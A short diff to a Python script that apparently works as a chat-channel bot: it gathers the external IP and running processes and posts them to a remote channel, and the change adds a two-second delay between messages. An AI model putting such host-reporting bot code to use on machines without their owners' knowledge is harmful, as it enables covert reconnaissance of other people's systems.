@@ -14,6 +14,7 @@ import locale # System language
 import urllib2 # Used to get external ip address
 import psutil # List processes
 import argparse # CLI arg parsing
+import time # For sleep()
 
 # CLI options
 parser = argparse.ArgumentParser()
@@ -74,6 +75,7 @@ def get_external_ip(): # Function to get external ip address
 
 def pslist(): # Function to list process names and pids
   for proc in psutil.process_iter():
+    time.sleep(2)
     sendmsg(channel, 'PID: ' + str(proc.pid) + ' | NAME: ' + proc.name)
 
 def sendmsg(chan , msg): # Function to send messages to the channel
